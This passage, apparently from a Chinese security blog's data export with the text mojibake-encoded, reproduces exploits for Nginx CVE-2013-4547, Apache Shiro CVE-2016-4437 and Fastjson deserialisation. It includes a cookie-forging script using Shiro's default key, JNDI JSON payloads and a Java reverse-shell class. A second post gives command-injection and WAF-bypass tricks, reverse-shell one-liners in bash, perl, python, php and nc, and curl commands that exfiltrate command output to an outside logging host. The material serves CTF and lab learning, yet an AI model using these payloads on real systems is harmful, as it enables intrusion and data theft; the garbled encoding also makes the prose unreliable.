å°±å¯ä»¥é˜²æ­¢é”™è¯¯è§£æã€‚ Nginx æ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆCVE-2013-4547ï¼‰è¿™ä¸ªè·Ÿä¸Šé¢çš„æŒºåƒçš„ï¼Œéæ³•å­—ç¬¦ç©ºæ ¼å’Œæˆªæ­¢ç¬¦ï¼ˆ\\0ï¼‰ä¼šå¯¼è‡´Nginxè§£æURIæ—¶çš„æœ‰é™çŠ¶æ€æœºæ··ä¹±ï¼Œå±å®³æ˜¯å…è®¸æ”»å‡»è€…é€šè¿‡ä¸€ä¸ªéç¼–ç ç©ºæ ¼ç»•è¿‡åç¼€åé™åˆ¶ã€‚http://127.0.0.1/file.aaa \\0.phpä¸ç”¨è¯´ä¹ŸçŸ¥é“webshellå§¿åŠ¿+1 è¿˜æœ‰å‡ ä¸ªé…ç½®æ¼æ´å°±ä¸å¤ç°äº†hhh Apache Shiro 1.2.4ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2016-4437ï¼‰ä¸¥æ ¼æ¥è¯´è‡ªå·±å¹¶æ²¡æœ‰ç”¨vulhubçš„é•œåƒå®Œæˆå¤ç°.æ‰€ä»¥è‡ªå·±æ‰¾äº†ç½‘ä¸Šå…¶ä»–çš„å¤ç°æ–‡ç« ï¼Œç”¨äº†ä¸‹medicean/vulapps:s_shiro_1è¿™ä¸ªé•œåƒ,å§‘ä¸”æ˜¯èƒ½åšäº† Apache Shiro 1.2.4åŠä»¥å‰ç‰ˆæœ¬ä¸­ï¼ŒåŠ å¯†çš„ç”¨æˆ·ä¿¡æ¯åºåˆ—åŒ–åå­˜å‚¨åœ¨åä¸ºremember-meçš„Cookieä¸­ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨Shiroçš„é»˜è®¤å¯†é’¥ä¼ªé€ ç”¨æˆ·Cookieï¼Œè§¦å‘Javaååºåˆ—åŒ–æ¼æ´ï¼Œè¿›è€Œåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ é¦–å…ˆå°±è¦å‡†å¤‡çš„æ˜¯javaååºåˆ—åŒ–çš„å·¥å…·ysoserial.è‡ªå·±ä¹‹å‰è¿˜åªç”¨è¿‡ysoserial.netã€‚æ²¡ç”¨è¿‡æœ¬å°Šè¿™ä¸ªjavaååºåˆ—åŒ–ç¥å™¨ã€‚å¯ä»¥ç›´æ¥å»githubé¡¹ç›®ä¸Šæ‰¾å·²ç»ç¼–è¯‘å¥½çš„jar.æˆ–è€…git cloneæºç ç”¨mvnç¼–è¯‘ã€‚æš‚ä¸”ä¸æã€‚ ç„¶åé¦–å…ˆéœ€è¦æ„é€ gadget.æˆ‘çš„ç›®çš„æ˜¯åå¼¹shell.æ‰€ä»¥è¦æŠŠåå¼¹shellçš„ä»£ç å‡†å¤‡ä¸‹(æ³¨æ„ã€‚javaååºåˆ—è§¦å‘åå¼¹shellä¸€å®šä¸èƒ½ç›´æ¥ä¼ å‘½ä»¤çš„å­—ç¬¦ä¸²ï¼Œä¹‹å‰ghostcaté‡Œä¹Ÿæè¿‡äº†,å¿…é¡»è¦å­—ç¬¦ä¸²æ•°ç»„,å¦åˆ™&gt;è¿™æ ·çš„å­—ç¬¦è¿‡ä¸å»)è€Œæ­¤å¤„æˆ‘ä»¬é€‰æ‹©base64 åŠ å·¥å‘½ä»¤æ‰§è¡Œä»£ç è§£å†³è¿™ä¸ªé—®é¢˜å¯ä»¥ç”¨ä¸‹é¢è¿™ä¸ªç½‘ç«™ç›´æ¥å¾—åˆ°ç¼–ç payloadhttp://www.jackson-t.ca/runtime-exec-payloads.htmlè¿è¡Œå‘½ä»¤ 1java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 'BASE64_ENCODED_COMMAND' è¿™æ ·å°±èµ·äº†ä¸€ä¸ªJRMPæœåŠ¡ç›‘å¬6666ç«¯å£ã€‚å®ƒä¼šæ¥å—è¢«æ”»å‡»çš„æœåŠ¡å™¨ä¿¡æ¯å¹¶ååºåˆ—åŒ–ï¼Œæ‰§è¡Œgadgetå¯¹åº”çš„å‘½ä»¤ æ¥ä¸‹æ¥å°±æ˜¯æ„é€ åºåˆ—åŒ–çš„cookie rememberMeäº†ã€‚é¦–å…ˆåœ¨ç™»å½•ç•Œé¢å‹¾é€‰remembermeå¹¶æŠ“åŒ…ï¼Œå‡†å¤‡æ›¿æ¢cookieä¸ºæˆ‘ä»¬çš„åˆ©ç”¨cookie åˆ©ç”¨ä¸‹é¢è¿™ä¸ªè„šæœ¬ç”Ÿæˆcookieï¼Œå‚æ•°ä¼ æ”»å‡»ipï¼šjavaç›‘å¬ç«¯å£ 123456789101112131415161718import uuidimport base64import subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command): popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = base64.b64decode(\"kPH+bIxk5D2deZiIxcaaaA==\") iv = uuid.uuid4().bytes encryptor = AES.new(key, AES.MODE_CBC, iv) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertext if __name__ == '__main__': payload = encode_rememberme(sys.argv[1]) print \"rememberMe=&#123;0&#125;\".format(payload.decode()) æœ¬è´¨ä¸Šæ˜¯åˆ©ç”¨äº†shiroé»˜è®¤å¯†é’¥è¿›è¡ŒAESåŠ å¯†ã€‚æ‰€ä»¥å¯è§ç¡¬ç¼–ç å¸¦æ¥çš„å±å®³ï¼Œå¯¼è‡´cookieå¯æ§å³å¯è§¦å‘ååºåˆ—åŒ–ã€‚ç”Ÿæˆçš„cookieæ›¿æ¢å³å¯è§¦å‘ååºåˆ—åŒ–ncç›‘å¬ç«¯å£å¾—åˆ°åå¼¹shell vulhubçš„ç¯å¢ƒä¸çŸ¥é“ä¸ºä»€ä¹ˆå¼¹ä¸åˆ°shell,è€Œå®ƒç»™å‡ºçš„æ–¹æ³•gadgetä¹Ÿå®Œå…¨ä¸ä¸€æ ·,ä¸è¿‡æ€è·¯å¤§åŒå°å¼‚ã€‚å°±æ˜¯æˆ‘çš„eclipseåŠ è½½é¡¹ç›®åŠå¤©æ²¡æå¥½â€¦ fastjson 1.2.24 ååºåˆ—åŒ–å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´æœ€è¿‘è«åæ„Ÿè§‰javaçš„é¢˜å¤šèµ·æ¥äº†ï¼Œåœ¨è§‚æ‘©å…¶ä»–dalaoä»¬çš„blogæ—¶ä¹Ÿå‘ç°ä¸å°‘å†…å®¹éƒ½åœ¨æ·±åº¦ç ”ç©¶javaçš„ç›¸å…³æ¼æ´ã€‚æ‰€ä»¥è‡ªå·±ä¹Ÿæ¥å°è¯•å¤šå¤ç°å‡ ä¸ªååºåˆ—åŒ–çš„æ´ã€‚è‡³å°‘å…ˆå½“ä¸ªè„šæœ¬å°å­,ç­‰åˆ°æš‘å‡å°±èƒ½å¥½å¥½ç ”ç©¶äº†ã€‚ é¦–å…ˆæ˜¯1.2.24çš„fastjson.è¿™é‡Œä¸»è¦æ˜¯ä¸€ä¸ªjndiæ³¨å…¥ã€‚å…¶åˆ©ç”¨æµç¨‹å¦‚ä¸‹ï¼šé¦–å…ˆå‡†å¤‡å¥½åˆ©ç”¨çš„æºç exp.java 123456789101112131415import java.lang.Runtime;import java.lang.Process;public class exp &#123; static &#123; try &#123; Runtime rt = Runtime.getRuntime(); String[] commands = &#123; \"/bin/bash\", \"-c\", \"bash -i &gt;&amp; /dev/tcp/xxxxxx/9001 0&gt;&amp;1\" &#125;; Process pc = rt.exec(commands); pc.waitFor(); &#125; catch (Exception e) &#123; // do nothing &#125; &#125;&#125; ç„¶åjavac exp.javaç¼–è¯‘å¥½å¾—åˆ°exp.classã€‚ è€ŒæœåŠ¡ç«¯åœ¨Content-Type:application/jsonä¸‹,post jsonæ•°æ® 1234567&#123; \"b\":&#123; \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://xxx:9999/exp\", \"autoCommit\":true &#125;&#125; è¿™é‡Œç”¨åˆ°äº†marshalsecè¿™ä¸ªå·¥å…·ã€‚åŸºæœ¬ä¸Šè·Ÿysoserialç”¨èµ·æ¥ä¸€æ ·çš„ã€‚æ‹·è´æºç mavenç¼–è¯‘å°±å¥½æ¥ä¸‹æ¥å¯åŠ¨ä¸€ä¸ªRMIæœåŠ¡å™¨ï¼Œç›‘å¬9999ç«¯å£ï¼Œå¹¶åˆ¶å®šåŠ è½½è¿œç¨‹ç±»exp.class 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http:&#x2F;&#x2F;xxx&#x2F;#exp&quot; 9999 å®‰å…¨èµ·è§,æœ€å¥½è¿˜æ˜¯æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹æ”¾classæ–‡ä»¶å¹¶ç”¨pythonç›‘å¬80ç«¯å£. æœ¬æœºç›‘å¬9001ç«¯å£æ”¶åˆ°shell. æœ¬è´¨ä¸Šå°±æ˜¯,JdbcRowSetImplè¿™ä¸ªç±»çš„dataSourceNameæ”¯æŒä¼ å…¥ä¸€ä¸ªrmiçš„æº.å½“è§£æè¿™ä¸ªuriçš„æ—¶å€™ï¼Œå°±ä¼šæ”¯æŒrmiè¿œç¨‹è°ƒç”¨ï¼Œå»æŒ‡å®šçš„rmiåœ°å€ä¸­å»è°ƒç”¨æ–¹æ³•ã€‚å½“è¿œç¨‹rmiæœåŠ¡æ‰¾ä¸åˆ°å¯¹åº”æ–¹æ³•æ—¶ï¼Œå¯ä»¥æŒ‡å®šä¸€ä¸ªè¿œç¨‹classè®©è¯·æ±‚æ–¹å»è°ƒç”¨ï¼Œä»è€Œå»è·å–æˆ‘ä»¬æ¶æ„æ„é€ çš„classæ–‡ä»¶ï¼Œä»è€ŒRCEã€‚ èµ·ä¸€ä¸ªldapæœåŠ¡ä¹Ÿæ˜¯ä¸€æ ·çš„,è€Œä¸”ldapä¼¼ä¹æ¯”rmié€‚ç”¨æ€§æ›´å¹¿ã€‚åªè¦æ”¹æˆjava -cp marshalsec.jar marshalsec.jndi.LDAPRefServerå¹¶æŠŠpayloadä¸­çš„rmi://æ¢æˆldap://å³å¯ã€‚ æ³¨æ„ä¸‹è¿™ä¸¤ä¸ªæœåŠ¡åˆ©ç”¨ç‰ˆæœ¬ åŸºäºrmiçš„åˆ©ç”¨æ–¹å¼ï¼šé€‚ç”¨jdkç‰ˆæœ¬ï¼šJDK 6u132, JDK 7u122, JDK 8u113ä¹‹å‰ã€‚ åŸºäºldapçš„åˆ©ç”¨æ–¹å¼ï¼šé€‚ç”¨jdkç‰ˆæœ¬ï¼šJDK 11.0.1ã€8u191ã€7u201ã€6u211ä¹‹å‰ã€‚ Fastjson 1.2.47 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´è·Ÿä¸Šé¢æ²¡å•¥å¤§åŒºåˆ«ã€‚ç¯å¢ƒæ˜¯openjdk:8u102ã€‚åŒæ ·å¯ä»¥åŠ è½½rmi å®é™…ä¸Šæ˜¯å› ä¸ºæœ€æ—©çš„fastjsonååºåˆ—åŒ–ä¹Ÿå°±æ˜¯ä¸Šé¢é‚£ä¸ª,æ˜¯æ”¯æŒååºåˆ—åŒ–ä»»æ„ç±»çš„ã€‚åªè¦æœ‰@typeå°±èƒ½åšåˆ°ã€‚è€Œåé¢çš„ç‰ˆæœ¬ä¸»è¦æ˜¯ç¦æ­¢äº†ååºåˆ—åŒ–ä»»æ„ç±»çš„æ“ä½œ,å¹¶ä¸”å¯¹å¯ä»¥åˆ©ç”¨çš„ç±»åŠ å…¥é»‘åå•è€Œå·²ã€‚Fastjsonååºåˆ—åŒ–æ¼æ´ 1.2.24-1.2.48 è€Œè¿™ä¸ªç‰ˆæœ¬1.2.47çš„payloadåˆ™æ— éœ€å¼€å¯autotypeé€šæ€ 1234567891011&#123; \"a\":&#123; \"@type\":\"java.lang.Class\", \"val\":\"com.sun.rowset.JdbcRowSetImpl\" &#125;, \"b\":&#123; \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://xxxx:9999/Exploit\", \"autoCommit\":true &#125;&#125; ç„¶åè·Ÿä¸Šé¢æµç¨‹ä¸€æ ·çš„ç›´æ¥æ‰“,æ‹¿åˆ°shell.","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"}]},{"title":"å­¦ä¹ ç¬”è®°-å‘½ä»¤æ‰§è¡ŒåŠèŠ±å¼bypasså†™shell","slug":"å­¦ä¹ ç¬”è®°-å‘½ä»¤æ‰§è¡ŒåŠèŠ±å¼bypasså†™shell","date":"2020-03-02T13:57:46.000Z","updated":"2021-02-18T05:08:41.755Z","comments":true,"path":"2020/03/02/å­¦ä¹ ç¬”è®°-å‘½ä»¤æ‰§è¡ŒåŠèŠ±å¼bypasså†™shell/","link":"","permalink":"https://www.bycsec.top/2020/03/02/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8A%E8%8A%B1%E5%BC%8Fbypass%E5%86%99shell/","excerpt":"å‘½ä»¤æ‰§è¡Œçš„å‘å…¶å®æ—©å°±æƒ³å¡«äº†ã€‚æœ€æ—©æ˜¯å› ä¸ºæ ¡èµ›æ—¶ï¼Œeasyphpä¸€é¢˜è‡ªå·±å› ä¸ºä¸ç†Ÿæ‚‰å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›ç‰¹æ€§å¯¼è‡´å¥—å¨ƒé¢˜ç»•åˆ°æœ€åä¸€å±‚å´æ²¡æ‹¿åˆ°flagã€‚å½“æ—¶ååˆ†ä¸çˆ½ï¼Œä¸‹å®šå†³å¿ƒè¦å¥½å¥½äº†è§£ä¸‹å‘½ä»¤æ‰§è¡Œçš„ç›¸å…³çŸ¥è¯†ç‚¹ã€‚ å…³äºå‘½ä»¤æ‰§è¡Œæˆ‘å¤§ä½“ä¸Šå½’ä¸ºphpç»•è¿‡+rceä¸¤ç±»ã€‚phpçš„éš¾ç‚¹ä¸»è¦æ˜¯åœ¨ç»•è¿‡å†™shellä¸Šï¼Œè€Œlinuxçš„çŸ¥è¯†ä¸»è¦åœ¨RCEè¾¾æˆä¸Šã€‚ å…ˆä»ç®€å•è¯´èµ·ï¼š","text":"å‘½ä»¤æ‰§è¡Œçš„å‘å…¶å®æ—©å°±æƒ³å¡«äº†ã€‚æœ€æ—©æ˜¯å› ä¸ºæ ¡èµ›æ—¶ï¼Œeasyphpä¸€é¢˜è‡ªå·±å› ä¸ºä¸ç†Ÿæ‚‰å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›ç‰¹æ€§å¯¼è‡´å¥—å¨ƒé¢˜ç»•åˆ°æœ€åä¸€å±‚å´æ²¡æ‹¿åˆ°flagã€‚å½“æ—¶ååˆ†ä¸çˆ½ï¼Œä¸‹å®šå†³å¿ƒè¦å¥½å¥½äº†è§£ä¸‹å‘½ä»¤æ‰§è¡Œçš„ç›¸å…³çŸ¥è¯†ç‚¹ã€‚ å…³äºå‘½ä»¤æ‰§è¡Œæˆ‘å¤§ä½“ä¸Šå½’ä¸ºphpç»•è¿‡+rceä¸¤ç±»ã€‚phpçš„éš¾ç‚¹ä¸»è¦æ˜¯åœ¨ç»•è¿‡å†™shellä¸Šï¼Œè€Œlinuxçš„çŸ¥è¯†ä¸»è¦åœ¨RCEè¾¾æˆä¸Šã€‚ å…ˆä»ç®€å•è¯´èµ·ï¼š linux å‘½ä»¤&amp; RCErce,å³remote command/code executeã€‚é€šå¸¸éƒ½æ˜¯æ¸—é€ä¸­å¸Œæœ›èƒ½å¤Ÿåˆ©ç”¨çš„æ¼æ´ä¹‹ä¸€ã€‚å› ä¸ºæˆ‘ä»¬å¯ä»¥ä»¥æ­¤è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œè¯»å–æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶æˆ–è€…åå¼¹shellã€‚ å‘½ä»¤åŠå…³é”®å­—wafç®€å•çš„å‘½ä»¤æ‰§è¡Œå¦‚DVWAé¶åœºé‡Œçš„command injection æ¨¡å—ã€‚å®ƒç»™äº†æˆ‘ä»¬ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œè€Œå®ƒä¼šå°†è¾“å…¥æ¡†çš„å†…å®¹å½“åšå‘½ä»¤æ‰§è¡Œã€‚è¿™æ ·ä¸€æ¥æˆ‘ä»¬å°±å¯ä»¥ç”¨å‘½ä»¤æ‹¼æ¥æ¥æ‰§è¡Œå…¶ä»–å‘½ä»¤ã€‚1.ä½¿ç”¨&amp;&amp; &amp; ;ç›´æ¥å¤šè¯­å¥æ‰§è¡Œ 123127.0.0.1&amp;&amp;ls127.0.0.1&amp;ls127.0.0.1; ls 2.é«˜çº§ä¸€(äº¿)ç‚¹çš„ï¼Œä½¿ç”¨ç®¡é“ç¬¦ 1127.0.0.1| ls ç®¡é“ç¬¦çš„å¦™ç”¨ä¸æ­¢è¿™ä¹ˆä¸€ç‚¹äº†ã€‚æ¯”å¦‚CTFæˆ–å®æˆ˜æ¸—é€ä¸­éƒ½å¯èƒ½ç”¨åˆ°çš„ 1echo 'Y2F0Cg==' | base64 -d åªè¦ç”¨ç®¡é“ç¬¦å¯ä»¥bypassæ‰ç»å¤§éƒ¨åˆ†å…³é”®å­—çš„wafã€‚å®é™…åˆ©ç”¨ä¹‹è¯»flag.php 1echo Y2F0IGZsYWcucGhw|base64 -d|bash bashå¦‚æœæ²¡æœ‰å¯ä»¥ç”¨sh 1echo Y2F0IGZsYWcucGhw|base64 -d|sh åŒæ—¶åº”å¯¹å…³é”®å­—wafï¼Œlinuxçš„ç‰¹æ€§è¿˜å…è®¸æˆ‘ä»¬èŠ±å¼ç»•è¿‡å¯¹ç©ºæ ¼ 12345678$IFS$&#123;IFS&#125;$IFS$1 //$1æ”¹æˆ$åŠ å…¶ä»–æ•°å­—è²Œä¼¼éƒ½è¡Œ&lt; &lt;&gt; &#123;cat,flag.php&#125; //ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½%20 %09 å¯¹å…³é”®å­—ï¼Œå¦‚flagï¼Œcatï¼ŒåŒ…æ‹¬ä¸Šé¢ç®¡é“ç¬¦åœ¨å†…ä¹Ÿæœ‰å¾ˆå¤šæ–¹æ³•ã€‚ 12345cat fl* linuxä¸­*é€šé…ç¬¦åŒ¹é…ä»»æ„å­—æ•°echo xxxxxxx| base64 -d ca\\t fla\\gcat fl''aga=f;b=lag;cat $a$b å¯¹å‘½ä»¤å‡½æ•°catçš„waf,å¯»æ‰¾æ›¿ä»£ä¹Ÿæ˜¯ä¸€ç§æ–¹æ³•ï¼Œæ¯•ç«Ÿè¯»å–æ–‡ä»¶å‡½æ•°å¾ˆå¤šã€‚ 12345678head è¯»å¤´å‡ è¡Œtail è¯»å°¾å‡ è¡Œtac æŒ‰è¡Œå€’ç€è¯»more lessnlsort...... å¦‚æœè¦å¥‡æ·«æŠ€å·§ï¼Œå¯ä»¥ä½¿ç”¨å¦‚cat `ls`åå¼•å·åœ¨linuxä¸­ä½œä¸ºå†…è”æ‰§è¡Œã€‚å°†ç›´æ¥è¾“å‡ºç»“æœã€‚æ‰€ä»¥å‡å¦‚æˆ‘ä»¬å°±åœ¨flagçš„ç›®å½•ä¸‹ï¼Œè¿™æ˜¯å®Œå…¨å¯ä»¥ç›´æ¥è€çš„ã€‚ ä»¥ä¸Šéƒ½æ˜¯ç›´æ¥åœ¨webshellæ‰§è¡Œè¯»å–æ–‡ä»¶çš„åŸºç¡€ä¸Šçš„ã€‚å®é™…ä¸Šæœ‰æ—¶å€™æˆ‘ä»¬åœ¨å®é™…æ¸—é€ä¸­éœ€è¦çš„æ˜¯åå¼¹shellã€‚åŒ…æ‹¬æœ‰çš„é¢˜ç›®ä¹Ÿæ˜¯éœ€è¦shellæ¥æ‰¾flagçš„ã€‚http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheetè¿™ä¸ªç½‘ç«™æ€»ç»“äº†å¸¸è§çš„åå¼¹shellçš„æ–¹å¼ã€‚å®é™…ä¸Šæ€»ç»“ä¸‹å¸¸è§çš„å‡ ç§åå¼¹shell1.bash 1bash -c \"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\" bashå¼çš„ç”¨åˆ°çš„éå¸¸å¤šã€‚ç„¶è€Œè¿˜æ˜¯ä¼šå‡ºç°æœ‰çš„å®¹å™¨å› ä¸ºæ˜¯dockerèµ·çš„è€Œæ²¡æœ‰bashæŒ‡ä»¤çš„é—®é¢˜ï¼Œè¿™ç§æ—¶å€™é€šå¸¸ç”¨shæ›¿ä»£ã€‚ä½†æ˜¯shå¹¶ä¸èƒ½åå¼¹shellã€‚æ‰€ä»¥è¿™å°±æ¶‰åŠåˆ°å…¶ä»–çš„å‡ ç§æ–¹æ³•ã€‚ 2.perl 1perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;;' 3.python 1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' é€‰æ‹©pythonæ˜¯ä¸ªä¸é”™çš„æ›¿ä»£æ–¹å¼ï¼Œå› ä¸ºå¤§éƒ¨åˆ†linuxæœºå­ä¸Šéƒ½è£…å¥½äº†pythonã€‚(æ¯”å¦‚é¢˜ç›®ç¯å¢ƒæ˜¯flaskèµ·çš„æ—¶å€™ï¼Œè‚¯å®šæ˜¯æœ‰pythonäº†)4.php 1php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");' phpåŒç†ã€‚5.netcat 1nc -e /bin/sh 10.0.0.1 1234 åŸæ¥çœ‹åˆ°æ–‡ç« è¯´ï¼Œæ‰€æœ‰linuxæœºå­éƒ½é¢„è£…å¥½äº†ncã€‚æˆ‘è§‰å¾—æ˜¯å¾ˆæ£’çš„ã€‚ä¸è¿‡è‡ªå·±å°è¯•è¿‡ncåå¼¹çš„shelläº¤äº’æ€§ç¨å¾®å·®äº†ä¸€ç‚¹ç‚¹ã€‚ å¦‚æœé‡åˆ°wafï¼Œå¯ä»¥ç”¨ä¸Šé¢æ™®é€šå‘½ä»¤ä¸€æ ·çš„bypassæ–¹æ³•è§£å†³ã€‚æˆ–è€…æˆ‘ä»¬å¯ä»¥å¦‚æ­¤ï¼Œä½¿ç”¨curl wgetç­‰ç­‰ç›´æ¥è®¿é—®æˆ‘ä»¬vpsä¸Šçš„æå‰å†™å¥½çš„åå¼¹shellæ–‡ä»¶ã€‚ ä¹‹äºæ›´æ·±ä¸€æ­¥çš„å‘½ä»¤æ‰§è¡Œæš‚ä¸”ä¸è°ˆã€‚åœ¨æ¸—é€ä¸­è‡ªç„¶ä¼šç”¨åˆ°çš„ã€‚ bypassé•¿åº¦é™åˆ¶HITCON2017çš„baby-first-revengeçš„ä¾‹å­å¯ä»¥è¯´æ˜¯è€ä¾‹å­äº†ã€‚å®ƒçš„bypassé•¿åº¦å¯ä»¥è¾¾åˆ°5ä¸ªå…·ä½“trickæ˜¯ä»¥ä¸‹è¿™äº›ï¼š 1234ls -t å¯ä»¥æŒ‰æ—¶é—´é¡ºåºåˆ—å‡ºæ‰€æœ‰æ–‡ä»¶linux å¯ä»¥ç”¨\\è¿›è¡Œå‘½ä»¤çš„æ¢è¡Œæ¢è¡Œä¸å½±å“å‘½ä»¤æ‰§è¡Œsh _åªè¦å››ä¸ªå­—ç¬¦å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤ ç„¶è€Œå› ä¸ºè¿™ä¸ªè§£å†³æ–¹æ¡ˆå¤ªè¿‡é«˜çº§ï¼Œå¯¼è‡´å¤§å®¶éƒ½ä¼šäº†åå°±ä¸ä¼šå†æœ‰äººå‡ºè¿™æ–¹é¢çš„é¢˜ç›®è€ƒå¯Ÿäº†â€¦â€¦ ç›²æ‰“ RCE &amp; timebased RCEtime-based RCEæ˜¯ä¸€ä¸ªå¸¸å¸¸ä½œä¸ºæ‹”é«˜æ°´å¹³çš„å‘½ä»¤æ‰§è¡Œè€ƒç‚¹ã€‚å…·ä½“å¸¸è§äºä¸€ä¸‹ä»£ç  123&lt;?php$cmd = $_GET[`cmd`];`$cmd`; å½“æˆ‘ä»¬çš„å‘½ä»¤æ‰§è¡Œæ²¡æœ‰å›æ˜¾æ€ä¹ˆåŠï¼Ÿå¸¸è§åŠæ³•ä¹‹ä¸€å½“ç„¶æ˜¯åˆ©ç”¨curl,æˆ–è€…wgetæŠŠç»“æœæ‰“åˆ°vpsä¸Šã€‚æœ‰ç‚¹xxeç›²æ‰“çš„å‘³é“ã€‚åªä¸è¿‡å¹¶ä¸éœ€è¦æå‰æ”¾å¥½æ–‡ä»¶ï¼Œåªè¦vpsç›‘å¬å³å¯ã€‚ 1curl http://ip.port.b182oj.ceye.io/`ls` å½“ç„¶getè¯·æ±‚çš„å¼Šç«¯ä¹‹ä¸€æ˜¯æˆ‘ä»¬åªèƒ½æ‰“å‡ºç»“æœçš„ä¸€è¡Œç»“æœï¼Œè¿™å½“ç„¶æ˜¯ä¸è¡Œçš„ä½†æ˜¯æˆ‘ä»¬å¯ä»¥è½»æ¾åˆ©ç”¨sedå‘½ä»¤è§£å†³é—®é¢˜ã€‚ 123curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p`curl http://ip.port.b182oj.ceye.io/`ls | sed -n 2p`curl http://ip.port.b182oj.ceye.io/`ls | sed -n 3p` å°†åˆ†åˆ«æ‰“å‡ºæ¯ä¸€è¡Œçš„ä¿¡æ¯ã€‚è¿›ä¸€æ­¥è¿˜å¯ä»¥æ‰“å‡ºä»»æ„è¡Œä»»æ„å­—æ®µå†…å®¹ 123curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p | cut -c 1` æˆªå–ç¬¬ä¸€ä¸ªå­—curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p | cut -c 1-3` æˆªå–ç¬¬1~3ä¸ªå­—curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p | cut -c 2-5` æˆªå–ç¬¬2~5ä¸ª åœ¨æ­¤åŸºç¡€ä¸Šä¹Ÿè¯ç”Ÿäº†time-based RCEã€‚åŸç†å°±å¦‚ä¸Šé¢ä¸€æ ·ã€‚å› ä¸ºå·²ç»æ²¡æœ‰å›æ˜¾äº†ï¼Œæˆ‘ä»¬åœ¨æµè§ˆå™¨é¡µé¢å°±å¯ä»¥ç›´æ¥æ„é€ rce 1if [$(whoami|base32|cut â€“c 1)=O];then sleep 10;fi ç±»ä¼¼sqlæ—¶é—´ç›²æ³¨çš„åŸç†ã€‚å…¶ä¸­[ ]æ˜¯linuxçš„æ¡ä»¶è¡¨è¾¾å¼ç¬¦å·ã€‚ä½¿ç”¨base32æ˜¯å› ä¸ºæˆ‘ä»¬çš„è¿”å›å€¼å¯èƒ½æœ‰ç‰¹æ®Šå­—ç¬¦ã€‚è¿™æ ·å°±å®Œå…¨å¯ä»¥ä¾é ç›²æ‰“è„šæœ¬æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚ å…³äºlinuxå‘½ä»¤è¿˜æœ‰äº›tricks æ²¡æœ‰æåˆ°ï¼Œä¸€æ–¹é¢æ˜¯å› ä¸ºè‡ªå·±äº†è§£çš„æ¯•ç«Ÿæ˜¯æœ‰é™çš„ã€‚å¦ä¸€æ–¹é¢æ˜¯å› ä¸ºä¸‹é¢çš„å†…å®¹ä¸­å°†ç»§ç»­ä½¿ç”¨åˆ°ã€‚å…³äºphpç»“åˆlinuxå‘½ä»¤çš„ä¸€äº›tricksã€‚ php RCE bypass &amp; èŠ±å¼å†™shellphpä¸­çš„RCEæ–¹å¼å¯ä¸å°‘ã€‚é€šå¸¸æœ€å¤§çš„éš¾ç‚¹æ˜¯å†™ä¸€ä¸ªwebshellå‡ºæ¥ã€‚è€Œå†™å‡ºwebshellåæ‰§è¡Œå‘½ä»¤ä¹Ÿä¼šé‡åˆ°ç¦ç”¨ç³»ç»Ÿå‡½æ•°çš„æƒ…å†µã€‚è¿™ç§æ—¶å€™å°±æœ‰è®¸è®¸å¤šå¤šçš„é«˜çº§æŠ€å·§ã€‚ä¸ä»…ä»…æ˜¯phpçš„ç‰¹æ€§é—®é¢˜äº†ï¼Œè¿˜æœ‰è®¸å¤šé«˜çº§æ„é€ ã€‚ æ— å‚RCE ä¹‹æ‰€ä»¥æŠŠæ— å‚RCEæ”¾åˆ°è¿™ä¸€å—ã€‚å°±æ˜¯å› ä¸ºæ— å‚RCEçš„åˆ©ç”¨ä¸»è¦ä¾é phpå‡½æ•°è¾¾æˆã€‚æ‰€ä»¥å°ç»“ä¸‹å¸¸è§trickã€‚ 123if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) &#123; eval($_GET['code']);&#125; 